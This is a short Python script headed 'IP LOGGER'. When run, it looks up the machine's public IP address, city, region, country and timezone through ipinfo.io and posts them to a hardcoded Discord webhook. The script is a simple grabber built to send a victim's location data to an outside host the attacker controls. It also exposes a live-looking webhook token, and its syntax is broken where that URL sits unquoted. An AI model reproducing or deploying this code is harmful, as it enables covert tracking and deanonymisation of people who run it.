import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
ipsite = "https://ipinfo.io/json"
stats = requests.get(ipsite)
json_stats = stats.json()
city = json_stats["city"]
ip = json_stats["ip"]
region = json_stats["region"]
country = json_stats["country"]
timezone = json_stats["timezone"] 

webhookurl = " " #PUT YOUR WEBHOOK HERE

def embed():
  webhook = DiscordWebhook(url=https://discord.com/api/webhooks/1066600363056189470/90_0Qm9ZYfSLpMXkj3WCxhA_KvB1-EBvEM5R5ayMuS4WEYd8nzcgL-LbHwPQYrbyExaR)
  embed = DiscordEmbed(title=" ", color=242424)
  embed.add_embed_field(name=f"*__IP LOGGER__*", value=f"""
  **IP:** {ip}

  **CITY:** {city}

  **COUNTRY:** {country}

  **REGION:** {region}

  **TIMEZONE:** {timezone}
  """)
  embed.set_author(name=" ")
  embed.set_thumbnail(url='https://i.imgur.com/ejLScmL.png')
  embed.set_footer(text=f" ") 
  webhook.add_embed(embed)
  response = webhook.execute() 
embed()
